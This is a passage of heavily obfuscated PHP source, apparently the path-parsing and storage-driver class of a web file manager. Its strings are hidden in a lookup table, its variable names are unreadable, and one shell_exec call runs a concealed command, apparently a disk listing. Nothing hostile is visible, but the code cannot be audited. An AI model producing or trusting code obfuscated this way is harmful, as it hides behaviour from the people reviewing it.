"\173\x73\x68\141\162\x65\x49\x74\x65\155\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\x52\x65\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\x65\x72\x7d"; public static function typeList() { $¿Ù«ççğ =& $_SERVER[Î·Ü›öğ]; return array($¿Ù«ççğ[1366] => self::KOD_SOURCE, $¿Ù«ççğ[1367] => self::KOD_USER_RECYCLE, $¿Ù«ççğ[1368] => self::KOD_USER_FAV, $¿Ù«ççğ[1369] => self::KOD_USER_FILE_TAG, $¿Ù«ççğ[1370] => self::KOD_USER_FILE_TYPE, $¿Ù«ççğ[1371] => self::KOD_GROUP_ROOT_SELF, $¿Ù«ççğ[1372] => self::KOD_USER_SHARE, $¿Ù«ççğ[1373] => self::KOD_USER_SHARE_LINK, $¿Ù«ççğ[1374] => self::KOD_USER_SHARE_TO_ME, $¿Ù«ççğ[1375] => self::KOD_SHARE_ITEM, $¿Ù«ççğ[1376] => self::KOD_SHARE_LINK, $¿Ù«ççğ[1377] => self::KOD_SEARCH, $¿Ù«ççğ[1378] => self::KOD_BLOCK, $¿Ù«ççğ[1379] => self::KOD_IO, $¿Ù«ççğ[1380] => self::KOD_USER_RECENT, $¿Ù«ççğ[1381] => self::KOD_USER_DRIVER); } public static function parse($ş¥…•‡Œ) { $ú†è»° =& $_SERVER[Î·Ü›öğ]; $ş¥…•‡Œ = self::clear($ş¥…•‡Œ); $À§Ññ²š = array_values(self::typeList()); preg_match($ú†è»°[1382], $ş¥…•‡Œ, $æ«å™â¸); $öü¡Î = array($ú†è»°[507] => !1, $ú†è»°[1383] => !1, $ú†è»°[504] => !1, $ú†è»°[87] => $ş¥…•‡Œ, $ú†è»°[1280] => !1, $ú†è»°[1279] => $ú†è»°[12]); if (is_array($æ«å™â¸) && count($æ«å™â¸) == 5) { $¢Ô¬ÓÙ = $ú†è»°[1384] . $æ«å™â¸[2] . $ú†è»°[404]; if (in_array($¢Ô¬ÓÙ, $À§Ññ²š)) { $öü¡Î[$ú†è»°[1280]] = $æ«å™â¸[1]; $öü¡Î[$ú†è»°[33]] = $¢Ô¬ÓÙ; $öü¡Î[$ú†è»°[1385]] = substr($¢Ô¬ÓÙ, 1, -1); $öü¡Î[$ú†è»°[477]] = $æ«å™â¸[3]; } $öü¡Î[$ú†è»°[1279]] = $æ«å™â¸[4]; } if ($öü¡Î[$ú†è»°[507]] == self::KOD_SOURCE) { $öü¡Î[$ú†è»°[477]] = intval($öü¡Î[$ú†è»°[477]]); $öü¡Î[$ú†è»°[1283]] = $öü¡Î[$ú†è»°[477]]; } $–¦’°± = array($ú†è»°[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $öü¡Î[$ú†è»°[1348]] = in_array($öü¡Î[$ú†è»°[33]], $–¦’°±); return $öü¡Î; } public static function isTruePath($ÄÑçÍË) { $ïìôÍ¸ =& $_SERVER[Î·Ü›öğ]; if (substr($ÄÑçÍË, 0, 1) != $ïìôÍ¸[1384]) { return !0; } if (strpos($ÄÑçÍË, $ïìôÍ¸[494]) === 0) { return !0; } if (strpos($ÄÑçÍË, $ïìôÍ¸[1352]) === 0) { return !0; } if (strpos($ÄÑçÍË, $ïìôÍ¸[1386]) === 0) { return !0; } if (strpos($ÄÑçÍË, $ïìôÍ¸[1387]) === 0) { return !0; } if (strpos($ÄÑçÍË, $ïìôÍ¸[1388]) === 0) { return !0; } return !1; } public static function clear($”…ãû¤›) { $ÒÏñ»¸» =& $_SERVER[Î·Ü›öğ]; $”…ãû¤› = str_replace(array($ÒÏñ»¸»[1180], $ÒÏñ»¸»[288]), $ÒÏñ»¸»[53], $”…ãû¤›); $”…ãû¤› = str_replace($ÒÏñ»¸»[100], $ÒÏñ»¸»[8], $”…ãû¤›); $Å·¸Œ¿ò = $ÒÏñ»¸»[1389]; if (substr($”…ãû¤›, 0, 3) == $ÒÏñ»¸»[1390]) { $”…ãû¤› = substr($”…ãû¤›, 3); } while (strstr($”…ãû¤›, $Å·¸Œ¿ò)) { $”…ãû¤› = str_replace($Å·¸Œ¿ò, $ÒÏñ»¸»[8], $”…ãû¤›); } $”…ãû¤› = preg_replace($ÒÏñ»¸»[1391], $ÒÏñ»¸»[8], $”…ãû¤›); if ($”…ãû¤› == $ÒÏñ»¸»[8]) { return $ÒÏñ»¸»[8]; } $”…ãû¤› = rtrim($”…ãû¤›, $ÒÏñ»¸»[8]); return $”…ãû¤›; } public static function pathTrue($ÇºÑĞŠà) { $ƒ°¹Ò²² =& $_SERVER[Î·Ü›öğ]; if (!$ÇºÑĞŠà) { return $ƒ°¹Ò²²[12]; } $ÇºÑĞŠà = str_replace($ƒ°¹Ò²²[257], $ƒ°¹Ò²²[8], str_replace($ƒ°¹Ò²²[1392], $ƒ°¹Ò²²[8], $ÇºÑĞŠà)); $ÇºÑĞŠà = str_replace($ƒ°¹Ò²²[257], $ƒ°¹Ò²²[8], str_replace($ƒ°¹Ò²²[1392], $ƒ°¹Ò²²[8], $ÇºÑĞŠà)); if (!strstr($ÇºÑĞŠà, $ƒ°¹Ò²²[1390])) { return $ÇºÑĞŠà; } $…”›»à™ = explode($ƒ°¹Ò²²[8], $ÇºÑĞŠà); foreach ($…”›»à™ as $®‚‡Äæ => $»„¢Îé÷) { if ($»„¢Îé÷ !== $ƒ°¹Ò²²[1393]) { continue; } for ($¨Ùçû»ú = $®‚‡Äæ; $¨Ùçû»ú >= 0; $¨Ùçû»ú--) { if ($…”›»à™[$¨Ùçû»ú] === $ƒ°¹Ò²²[10] || $…”›»à™[$¨Ùçû»ú] === $ƒ°¹Ò²²[1393] || $…”›»à™[$¨Ùçû»ú] === -1) { continue; } if ($…”›»à™[$¨Ùçû»ú] === $ƒ°¹Ò²²[12]) { $…”›»à™[$®‚‡Äæ] = -1; break; } $…”›»à™[$®‚‡Äæ] = -1; $…”›»à™[$¨Ùçû»ú] = -1; break; } } $²òºÜû¸ = array(); foreach ($…”›»à™ as $»„¢Îé÷) { if ($»„¢Îé÷ !== -1) { $²òºÜû¸[] = $»„¢Îé÷; } } $Ï¦»Öî¤ = implode($ƒ°¹Ò²²[8], $²òºÜû¸); if (strpos($Ï¦»Öî¤, $ƒ°¹Ò²²[1394]) === 0) { $Ï¦»Öî¤ = $ƒ°¹Ò²²[1390] . substr($Ï¦»Öî¤, strlen($ƒ°¹Ò²²[1394])); } return $Ï¦»Öî¤; } public static function pathUrlClear($íº¤«ÖÉ) { $¤ŸÂÔç€ =& $_SERVER[Î·Ü›öğ]; if (!$íº¤«ÖÉ) { return $íº¤«ÖÉ; } $íº¤«ÖÉ = rawurldecode($íº¤«ÖÉ); $íº¤«ÖÉ = str_replace($¤ŸÂÔç€[1392], $¤ŸÂÔç€[8], $íº¤«ÖÉ); if (strpos($íº¤«ÖÉ, $¤ŸÂÔç€[76]) > 0) { $íº¤«ÖÉ = substr($íº¤«ÖÉ, 0, strpos($íº¤«ÖÉ, $¤ŸÂÔç€[76])); } if (strpos($íº¤«ÖÉ, $¤ŸÂÔç€[1395]) > 0) { $íº¤«ÖÉ = substr($íº¤«ÖÉ, 0, strpos($íº¤«ÖÉ, $¤ŸÂÔç€[1395])); } return $íº¤«ÖÉ; } public static function sourceID($ƒŞÃ„œ™) { $Ú’ÍŸšÕ =& $_SERVER[Î·Ü›öğ]; $«Ÿö¬ñŸ = self::parse($ƒŞÃ„œ™); if ($«Ÿö¬ñŸ[$Ú’ÍŸšÕ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ú’ÍŸšÕ[1396]), !1); } return $«Ÿö¬ñŸ[$Ú’ÍŸšÕ[477]]; } public static function make($‚³ãîëÜ) { if (!$‚³ãîëÜ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‚³ãîëÜ)); } public static function makeShare($ãîæÆì§, $øñŠğ™È) { return self::makePath(self::KOD_SHARE_ITEM, $ãîæÆì§, $øñŠğ™È); } public static function makeFileTypePath($—øÌÛâ) { return self::makePath(self::KOD_USER_FILE_TYPE, $—øÌÛâ); } public static function makeFileTagPath($–ºñ—ä¬) { return self::makePath(self::KOD_USER_FILE_TAG, $–ºñ—ä¬); } public static function makePath($Ø‹İø, $¢¹Óß÷Ç = '', $ãß—øÍ· = '') { $ú­Öã™ =& $_SERVER[Î·Ü›öğ]; $ı„‡Ÿ„Ô = substr($Ø‹İø, 1, -1); $¢´˜Ôö› = $ú­Öã™[1397] . $ı„‡Ÿ„Ô . $ú­Öã™[1398] . $¢¹Óß÷Ç . $ú­Öã™[1399]; $¢´˜Ôö› = $ãß—øÍ· ? $¢´˜Ôö› . $ãß—øÍ· . $ú­Öã™[8] : $¢´˜Ôö›; return $¢´˜Ôö›; } public static function hashPath($¿ËÌìàù, $½­•’” = false) { $üÑáæ©­ =& $_SERVER[Î·Ü›öğ]; if (!$¿ËÌìàù) { return $üÑáæ©­[12]; } $…İõâ½Ô = is_array($¿ËÌìàù) ? $¿ËÌìàù : IO::info($¿ËÌìàù); $‡„Êö = _get($…İõâ½Ô, $üÑáæ©­[1400], $üÑáæ©­[12]); if (!$‡„Êö && isset($…İõâ½Ô[$üÑáæ©­[554]])) { $‡„Êö = $…İõâ½Ô[$üÑáæ©­[554]]; } if (!$‡„Êö && isset($…İõâ½Ô[$üÑáæ©­[238]])) { $‡„Êö = trim($…İõâ½Ô[$üÑáæ©­[238]], $üÑáæ©­[121]); } if ($‡„Êö) { return $‡„Êö; } if (!$‡„Êö && isset($…İõâ½Ô[$üÑáæ©­[194]]) && $…İõâ½Ô[$üÑáæ©­[194]]) { $…İõâ½Ô = IO::info(KodIO::make($…İõâ½Ô[$üÑáæ©­[194]])); $‡„Êö = _get($…İõâ½Ô, $üÑáæ©­[1400], $üÑáæ©­[12]); if (!$‡„Êö && isset($…İõâ½Ô[$üÑáæ©­[554]])) { $‡„Êö = $…İõâ½Ô[$üÑáæ©­[554]]; } } $„ÃÇªÙÛ = md5($…İõâ½Ô[$üÑáæ©­[87]] . $…İõâ½Ô[$üÑáæ©­[79]] . $…İõâ½Ô[$üÑáæ©­[88]]); $Ãšïğ¨ = $„ÃÇªÙÛ . $üÑáæ©­[1401]; $‡„Êö = $‡„Êö ? $‡„Êö : Cache::get($Ãšïğ¨); if (!$‡„Êö && $½­•’”) { $‡„Êö = IO::hashSimple($…İõâ½Ô[$üÑáæ©­[87]]); Cache::set($Ãšïğ¨, $‡„Êö ? $‡„Êö : $„ÃÇªÙÛ, 3600 * 24 * 30); } return $‡„Êö ? $‡„Êö : $„ÃÇªÙÛ; } public static function hashPathSafe($¹ÇæØæ¯, $Á±˜¶˜° = false) { $¡š¢½ =& $_SERVER[Î·Ü›öğ]; $€ÈÒª… = self::hashPath($¹ÇæØæ¯, $Á±˜¶˜°); return md5($€ÈÒª… . $¡š¢½[1402] . Model($¡š¢½[862])->get($¡š¢½[863])); } public static function initSystemPath() { $…ëƒì =& $_SERVER[Î·Ü›öğ]; if (defined($…ëƒì[1403])) { return; } define($…ëƒì[1403], self::systemPath($…ëƒì[192])); define($…ëƒì[1404], self::systemPath($…ëƒì[1405])); define($…ëƒì[1406], self::systemPath($…ëƒì[1407])); define($…ëƒì[1408], self::systemPath($…ëƒì[1409])); IOHistory::bindEvent(); } public static function systemPath($âÇÈ‘ò†) { $€—¢°¿ =& $_SERVER[Î·Ü›öğ]; $Ë®üÍ—´ = $€—¢°¿[1410] . ucfirst($âÇÈ‘ò†); $†À¼„ë¨ = Model($€—¢°¿[862])->get($Ë®üÍ—´); if ($†À¼„ë¨) { return $†À¼„ë¨; } if ($âÇÈ‘ò† == $€—¢°¿[192]) { $†À¼„ë¨ = self::make(Model($€—¢°¿[922])->systemRootPathAdd($€—¢°¿[621])); } else { $†À¼„ë¨ = self::systemPath($€—¢°¿[192]); $¿£‡ñÂ„ = self::sourceID($†À¼„ë¨); $†À¼„ë¨ = self::make(Model($€—¢°¿[922])->mkdir($¿£‡ñÂ„, $âÇÈ‘ò†)); } Model($€—¢°¿[862])->set($Ë®üÍ—´, $†À¼„ë¨); return $†À¼„ë¨; } public static function systemFolder($§€ö¥ö) { $ö±üÙ÷ = IO_PATH_SYSTEM_SOURCE . $§€ö¥ö; $²Ù¤±ß = Cache::get($ö±üÙ÷); if (!$²Ù¤±ß) { $ÙšöÆ» = IO::infoFullSimple($ö±üÙ÷); if (!$ÙšöÆ») { $²Ù¤±ß = IO::mkdir($ö±üÙ÷, REPEAT_SKIP); } else { $²Ù¤±ß = $ÙšöÆ»[$_SERVER[Î·Ü›öğ][87]]; } Cache::set($ö±üÙ÷, $²Ù¤±ß, 3600 * 10); } return $²Ù¤±ß; } public static function defaultDriver() { return Model($_SERVER[Î·Ü›öğ][857])->defaultDriver(); } public static function defaultDriverInit() { $‹ŸË‹Ùì =& $_SERVER[Î·Ü›öğ]; static $òí•ƒ‰å = false; if ($òí•ƒ‰å) { return $òí•ƒ‰å; } $¸ØïÜÇ = self::defaultDriver(); $òí•ƒ‰å = IO::init($‹ŸË‹Ùì[1411] . $¸ØïÜÇ[$‹ŸË‹Ùì[477]] . $‹ŸË‹Ùì[1399]); return $òí•ƒ‰å; } public static function fileTypeList() { $Ø²“öó§ =& $_SERVER[Î·Ü›öğ]; $ïˆïğÜ = $GLOBALS[$Ø²“öó§[6]][$Ø²“öó§[1412]]; foreach ($ïˆïğÜ as $°ì¾¿ßº => $Ïá¿¿…Ö) { $ÖÅÍãî = $Ø²“öó§[1413] . $°ì¾¿ßº; $è”šúÚÕ = LNG($ÖÅÍãî); if ($ÖÅÍãî != $è”šúÚÕ) { $ïˆïğÜ[$°ì¾¿ßº][$Ø²“öó§[32]] = $è”šúÚÕ; } } return $ïˆïğÜ; } public static function ioFileDriverGet($´°è‘À¨ = '') { $Ğ¹Äí =& $_SERVER[Î·Ü›öğ]; static $¡²¸ôäƒ = array(); static $¢‡ëÇñÚ = array(); static $úÚøÖÜù = array(); static $ÎÜÂ¯ı = false; if ($ÎÜÂ¯ı === !1) { $ÎÜÂ¯ı = array($Ğ¹Äí[591] => array(), $Ğ¹Äí[678] => array()); $ÛËÛş¹ = Model($Ğ¹Äí[1414])->get(!1, $Ğ¹Äí[1415]); foreach ($ÛËÛş¹ as $Éõ¤©òÎ => $•ùÔ½·”) { if (!$•ùÔ½·” || $•ùÔ½·” == $Ğ¹Äí[12]) { continue; } if (strstr($Éõ¤©òÎ, $Ğ¹Äí[1416])) { $Œªûíá“ = str_replace($Ğ¹Äí[1416], $Ğ¹Äí[12], $Éõ¤©òÎ); $ÎÜÂ¯ı[$Ğ¹Äí[591]][$Œªûíá“] = $•ùÔ½·”; } else { if (strstr($Éõ¤©òÎ, $Ğ¹Äí[1417])) { $Œªûíá“ = str_replace($Ğ¹Äí[1417], $Ğ¹Äí[12], $Éõ¤©òÎ); $ÎÜÂ¯ı[$Ğ¹Äí[678]][$Œªûíá“] = $•ùÔ½·”; } } } } $šãµ˜ÁÍ = self::defaultDriver(); if (!$´°è‘À¨ || !$ÎÜÂ¯ı[$Ğ¹Äí[591]] && !$ÎÜÂ¯ı[$Ğ¹Äí[678]]) { return $šãµ˜ÁÍ; } $»±Ù¥ûé = self::getPathSourceID($´°è‘À¨); if (!$»±Ù¥ûé) { return $šãµ˜ÁÍ; } if (isset($¡²¸ôäƒ[$»±Ù¥ûé])) { return $¡²¸ôäƒ[$»±Ù¥ûé]; } $Ø¥áÖ¨„ = Model($Ğ¹Äí[922])->sourceInfo($»±Ù¥ûé); $Õ•áº–‘ = $Ø¥áÖ¨„[$Ğ¹Äí[582]]; $ÒììäÌ = array(); if (!$Ø¥áÖ¨„) { return $šãµ˜ÁÍ; } if ($Ø¥áÖ¨„[$Ğ¹Äí[191]] == $Ğ¹Äí[91]) { if (isset($úÚøÖÜù[$Õ•áº–‘])) { return $úÚøÖÜù[$Õ•áº–‘]; } if (isset($ÎÜÂ¯ı[$Ğ¹Äí[678]][$Õ•áº–‘])) { $Öâæ¦†Ø = Model($Ğ¹Äí[857])->driverInfo($ÎÜÂ¯ı[$Ğ¹Äí[678]][$Õ•áº–‘]); $šãµ˜ÁÍ = $Öâæ¦†Ø ? $Öâæ¦†Ø : $šãµ˜ÁÍ; $úÚøÖÜù[$Õ•áº–‘] = $šãµ˜ÁÍ; $¡²¸ôäƒ[$»±Ù¥ûé] = $šãµ˜ÁÍ; return $šãµ˜ÁÍ; } $ÒììäÌ = self::groupParentUser($Õ•áº–‘); } else { if ($Ø¥áÖ¨„[$Ğ¹Äí[191]] == $Ğ¹Äí[521]) { $ñïå¼Ï‰ = Model($Ğ¹Äí[1418])->getInfo($Õ•áº–‘); if ($ñïå¼Ï‰) { $ÒììäÌ = explode($Ğ¹Äí[50], trim($ñïå¼Ï‰[$Ğ¹Äí[597]], $Ğ¹Äí[50])); $ÒììäÌ = array_remove_value($ÒììäÌ, $Ğ¹Äí[231]); $ÒììäÌ[] = $Õ•áº–‘; $ÒììäÌ = array_reverse($ÒììäÌ); } } } foreach ($ÒììäÌ as $´ºĞ…Ùê) { if (!isset($ÎÜÂ¯ı[$Ğ¹Äí[591]][$´ºĞ…Ùê])) { continue; } if (isset($¢‡ëÇñÚ[$´ºĞ…Ùê])) { return $¢‡ëÇñÚ[$´ºĞ…Ùê]; } $Öâæ¦†Ø = Model($Ğ¹Äí[857])->driverInfo($ÎÜÂ¯ı[$Ğ¹Äí[591]][$´ºĞ…Ùê]); $šãµ˜ÁÍ = $Öâæ¦†Ø ? $Öâæ¦†Ø : $šãµ˜ÁÍ; $¢‡ëÇñÚ[$´ºĞ…Ùê] = $šãµ˜ÁÍ; break; } if ($Ø¥áÖ¨„[$Ğ¹Äí[191]] == $Ğ¹Äí[91]) { $úÚøÖÜù[$Õ•áº–‘] = $šãµ˜ÁÍ; } $¡²¸ôäƒ[$»±Ù¥ûé] = $šãµ˜ÁÍ; return $šãµ˜ÁÍ; } private static function getPathSourceID($âé÷ıñ¬) { $œ÷™îèÛ =& $_SERVER[Î·Ü›öğ]; static $ç¤à›ÀÃ = array(); if (!$âé÷ıñ¬) { return $œ÷™îèÛ[12]; } $²²«ªÈ = substr($âé÷ıñ¬, 0, strlen($œ÷™îèÛ[494])) == $œ÷™îèÛ[494]; $±é·Ñİµ = substr($âé÷ıñ¬, 0, strlen($œ÷™îèÛ[1386])) == $œ÷™îèÛ[1386]; $ıÊ”ó² = substr($âé÷ıñ¬, 0, strlen($œ÷™îèÛ[1387])) == $œ÷™îèÛ[1387]; if (!$²²«ªÈ && !$±é·Ñİµ && !$ıÊ”ó²) { return $œ÷™îèÛ[12]; } $è»õ»äÏ = self::parse($âé÷ıñ¬); $‡ƒ—İà = $è»õ»äÏ[$œ÷™îèÛ[1280]]; if ($²²«ªÈ) { return $è»õ»äÏ[$œ÷™îèÛ[477]]; } if (isset($ç¤à›ÀÃ[$‡ƒ—İà])) { $Öµ“âèŒ = $ç¤à›ÀÃ[$‡ƒ—İà]; } else { $Öµ“âèŒ = IO::init($‡ƒ—İà); $ç¤à›ÀÃ[$‡ƒ—İà] = $Öµ“âèŒ; } if (isset($Öµ“âèŒ->pathParse[$œ÷™îèÛ[1283]])) { return $Öµ“âèŒ->pathParse[$œ÷™îèÛ[1283]]; } return $œ÷™îèÛ[12]; } private static function groupParentUser($­ü¾½Áê) { $Ëú†÷Ğ¿ =& $_SERVER[Î·Ü›öğ]; $ŠÙù¯€¯ = Model($Ëú†÷Ğ¿[610])->getInfo($­ü¾½Áê); if (!$ŠÙù¯€¯) { return array(); } $ºğÈ‹¹ = array_to_keyvalue($ŠÙù¯€¯[$Ëú†÷Ğ¿[1419]], $Ëú†÷Ğ¿[12], $Ëú†÷Ğ¿[1420]); $¯”Ñ—Æ  = array(); foreach ($ŠÙù¯€¯[$Ëú†÷Ğ¿[1419]] as $Ô¬ÄòâÜ) { $¯”Ñ—Æ [] = $Ô¬ÄòâÜ[$Ëú†÷Ğ¿[1420]]; $şÓü¨ß = explode($Ëú†÷Ğ¿[50], trim($Ô¬ÄòâÜ[$Ëú†÷Ğ¿[597]], $Ëú†÷Ğ¿[50])); $şÓü¨ß = array_remove_value($şÓü¨ß, $Ëú†÷Ğ¿[231]); $şÓü¨ß = array_reverse($şÓü¨ß); $¯”Ñ—Æ  = array_merge($¯”Ñ—Æ , $şÓü¨ß); } return array_unique($¯”Ñ—Æ ); } public static function diskList($ëöÃŸÅÜ = true) { $ÜÑ¯¡—™ = $_SERVER[Î·Ü›öğ][1421]; if ($ëöÃŸÅÜ) { $…ŸÖ•„¯ = Cache::get($ÜÑ¯¡—™); if (is_array($…ŸÖ•„¯)) { return $…ŸÖ•„¯; } } $…ŸÖ•„¯ = self::diskListGet(); Cache::set($ÜÑ¯¡—™, $…ŸÖ•„¯, 60); return $…ŸÖ•„¯; } public static function diskListGet() { $ñï”øò¼ =& $_SERVER[Î·Ü›öğ]; $„½ŸåÙ· = array(); if ($GLOBALS[$ñï”øò¼[6]][$ñï”øò¼[1422]] == $ñï”øò¼[1423]) { $¯¶ë†— = $ñï”øò¼[1424]; for ($úšàÖ“ = 0; $úšàÖ“ < strlen($¯¶ë†—); $úšàÖ“++) { $Õ¬šÚÓ¢ = $¯¶ë†—[$úšàÖ“] . $ñï”øò¼[1425]; if (file_exists($Õ¬šÚÓ¢)) { $„½ŸåÙ·[] = $Õ¬šÚÓ¢; } } return $„½ŸåÙ·; } if (!function_exists($ñï”øò¼[101])) { $„½ŸåÙ·[] = $ñï”øò¼[935]; return $„½ŸåÙ·; } $ª¬‰ƒÔÒ = explode($ñï”øò¼[288], shell_exec($ñï”øò¼[1426])); array_shift($ª¬‰ƒÔÒ); array_pop($ª¬‰ƒÔÒ); $“É¢±ÜÃ = array($ñï”øò¼[1427], $ñï”øò¼[1428], $ñï”øò¼[1429], $ñï”øò¼[1430], $ñï”øò¼[1431], $ñï”øò¼[1432], $ñï”øò¼[1433], $ñï”øò¼[1434]); foreach ($ª¬‰ƒÔÒ as $¢œŒ«÷Á) { $åÆïÈïæ = preg_split($ñï”øò¼[1435], $¢œŒ«÷Á); $Õ¬šÚÓ¢ = $åÆïÈïæ[count($åÆïÈïæ) - 1]; if (!strstr($åÆïÈïæ[0], $ñï”øò¼[1436]) || !$Õ¬šÚÓ¢) { continue; } $Ò·êÁ‚Î = rtrim($Õ¬šÚÓ¢, $ñï”øò¼[8]) . $ñï”øò¼[8]; if (in_array($Ò·êÁ‚Î, $“É¢±ÜÃ)) { continue; } $„½ŸåÙ·[] = $Ò·êÁ‚Î; } return $„½ŸåÙ·; } public static function isSameDisk($–°Ş½•·, $Ş´×…ª) { $à¦úÅîû =& $_SERVER[Î·Ü›öğ]; if ($GLOBALS[$à¦úÅîû[6]][$à¦úÅîû[1422]] == $à¦úÅîû[1423]) { return strtolower(substr($–°Ş½•·, 0, 1)) == strtolower(substr($Ş´×…ª, 0, 1)); } $‘¿û×„½ = stat($–°Ş½•·); $ŸŞá¹º¸ = stat($Ş´×…ª); if ($‘¿û×„½ === !1 || $ŸŞá¹º¸ === !1) { return !1; } return $‘¿û×„½[$à¦úÅîû[1437]] === $ŸŞá¹º¸[$à¦úÅîû[1437]]; $ƒâÂ¤Ÿ½ = self::diskList(); $²Œè¿Œ¶ = !1; $Ç—Î©ĞŞ = !1; sort($ƒâÂ¤Ÿ½); $ƒâÂ¤Ÿ½ = array_reverse($ƒâÂ¤Ÿ½); $–°Ş½•· = rtrim($–°Ş½•·, $à¦úÅîû[8]) . $à¦úÅîû[8]; $Ş´×…ª = rtrim($Ş´×…ª, $à¦úÅîû[8]) . $à¦úÅîû[8]; foreach ($ƒâÂ¤Ÿ½ as $©ç£­Ç) { $Û™çö¤Á = strlen($©ç£­Ç); if (!$²Œè¿Œ¶ && substr($–°Ş½•·, 0, $Û™çö¤Á) == $©ç£­Ç) { $²Œè¿Œ¶ = $©ç£­Ç; } if (!$Ç—Î©ĞŞ && substr($Ş´×…ª, 0, $Û™çö¤Á) == $©ç£­Ç) { $Ç—Î©ĞŞ = $©ç£­Ç; } if ($²Œè¿Œ¶ && $Ç—Î©ĞŞ) { break; } } return $²Œè¿Œ¶ === $Ç—Î©ĞŞ; } public static function transferType($ğ¬ü™¨Ü, $ôîŠ³íÈ) { $ÁÆ¯·ÊŞ =& $_SERVER[Î·Ü›öğ]; $ÈØ¿è¼Ô = self::driverType($ğ¬ü™¨Ü); $‹¿Ñ¾š“ = self::driverType($ôîŠ³íÈ); if ($ÈØ¿è¼Ô[$ÁÆ¯·ÊŞ[33]] == $‹¿Ñ¾š“[$ÁÆ¯·ÊŞ[33]] && $ÈØ¿è¼Ô[$ÁÆ¯·ÊŞ[1438]] == $‹¿Ñ¾š“[$ÁÆ¯·ÊŞ[1438]]) { return $ÁÆ¯·ÊŞ[1439]; } if ($ÈØ¿è¼Ô[$ÁÆ¯·ÊŞ[33]] == $ÁÆ¯·ÊŞ[969] && $‹¿Ñ¾š“[$ÁÆ¯·ÊŞ[33]] == $ÁÆ¯·ÊŞ[109]) { return $ÁÆ¯·ÊŞ[1309]; } if ($ÈØ¿è¼Ô[$ÁÆ¯·ÊŞ[33]] == $ÁÆ¯·ÊŞ[109] && $‹¿Ñ¾š“[$ÁÆ¯·ÊŞ[33]] == $ÁÆ¯·ÊŞ[969]) { return $ÁÆ¯·ÊŞ[110]; } return $ÁÆ¯·ÊŞ[1440]; } public static function driverType($É×éÀÈ) { $ë‰±‹€ª =& $_SERVER[Î·Ü›öğ]; $Æ“áªÈç = str_replace($ë‰±‹€ª[1441], $ë‰±‹€ª[12], strtolower($É×éÀÈ->getType())); if ($Æ“áªÈç == $ë‰±‹€ª[847] || $Æ“áªÈç == $ë‰±‹€ª[1442] || $Æ“áªÈç == $ë‰±‹€ª[1443]) { $³Ñ½€µ = self::ioFileDriverGet($ë‰±‹€ª[494] . $É×éÀÈ->pathParse[$ë‰±‹€ª[1283]] . $ë‰±‹€ª[404]); $É×éÀÈ = IO::init($ë‰±‹€ª[1411] . $³Ñ½€µ[$ë‰±‹€ª[477]] . $ë‰±‹€ª[1399]); } else { if ($Æ“áªÈç == $ë‰±‹€ª[1319] || $Æ“áªÈç == $ë‰±‹€ª[1444]) { $É×éÀÈ = IO::init($É×éÀÈ->pathParse[$ë‰±‹€ª[1260]]); } } $†šÄ×¡Ò = $É×éÀÈ->path; $Æ“áªÈç = str_replace($ë‰±‹€ª[1441], $ë‰±‹€ª[12], strtolower($É×éÀÈ->getType())); if ($Æ“áªÈç == $ë‰±‹€ª[109]) { return array($ë‰±‹€ª[33] => $ë‰±‹€ª[109], $ë‰±‹€ª[1438] => $ë‰±‹€ª[12], $ë‰±‹€ª[87] => $†šÄ×¡Ò, $ë‰±‹€ª[98] => $É×éÀÈ); } return array($ë‰±‹€ª[33] => $ë‰±‹€ª[969], $ë‰±‹€ª[1438] => $É×éÀÈ->pathDriver, $ë‰±‹€ª[87] => $†šÄ×¡Ò, $ë‰±‹€ª[98] => $É×éÀÈ); } public static function pathDriverType($³õº˜Â¯) { return $³õº˜Â¯ ? self::driverType(IO::init($³õº˜Â¯)) : !1; } public static function pathDriverLocal($õƒÎô°‘) { $Š­ŒÎÒ‹ =& $_SERVER[Î·Ü›öğ]; $ğï¦ÎêÎ = $õƒÎô°‘ ? self::driverType(IO::init($õƒÎô°‘)) : !1; return strtolower($ğï¦ÎêÎ[$Š­ŒÎÒ‹[33]]) == $Š­ŒÎÒ‹[109] ? !0 : !1; } public static function allowCover($¨•ğ«† , $¾Š¤Ş˜” = true) { $àÉØ®’ =& $_SERVER[Î·Ü›öğ]; if (is_string($¨•ğ«† )) { $¨•ğ«†  = IO::info($¨•ğ«† ); } if (!$¨•ğ«†  || $¨•ğ«† [$àÉØ®’[33]] == $àÉØ®’[78] || $¨•ğ«† [$àÉØ®’[79]] <= 100) { return !1; } if (isset($¨•ğ«† [$àÉØ®’[1445]]) || !$¨•ğ«† [$àÉØ®’[87]]) { return !1; } if (isset($¨•ğ«† [$àÉØ®’[235]]) && !$¨•ğ«† [$àÉØ®’[235]]) { return !1; } static $µåèò‘ = false; if (!$µåèò‘ || !$¾Š¤Ş˜”) { $Ã”ñÄ¦ = self::driverType(IO::init($¨•ğ«† [$àÉØ®’[87]])); $îÃéÅø = $Ã”ñÄ¦[$àÉØ®’[98]]; $µåèò‘ = $àÉØ®’[197]; if ($Ã”ñÄ¦[$àÉØ®’[33]] == $àÉØ®’[109]) { $µåèò‘ = $àÉØ®’[1446]; } if ($Ã”ñÄ¦[$àÉØ®’[98]] && is_array($Ã”ñÄ¦[$àÉØ®’[98]]->config)) { $Åü£ş‘ = $Ã”ñÄ¦[$àÉØ®’[98]]->config; if (isset($Åü£ş‘[$àÉØ®’[1447]]) && $Åü£ş‘[$àÉØ®’[1447]]) { $µåèò‘ = $àÉØ®’[1446]; } } $Õˆãé›† = KodIO::defaultDriver(); if (strtolower($Õˆãé›†[$àÉØ®’[98]]) == $àÉØ®’[109] && is_array($Õˆãé›†[$àÉØ®’[6]])) { $¯ÎÖª« = $Õˆãé›†[$àÉØ®’[6]][$àÉØ®’[1292]]; if (substr($¯ÎÖª«, 0, 2) == $àÉØ®’[1448]) { $¯ÎÖª« = str_replace($àÉØ®’[1448], BASIC_PATH, $¯ÎÖª«); } $¯ÎÖª« = str_replace($àÉØ®’[257], $àÉØ®’[8], $¯ÎÖª«); if (substr($¨•ğ«† [$àÉØ®’[87]], 0, strlen($¯ÎÖª«)) == $¯ÎÖª«) { $µåèò‘ = 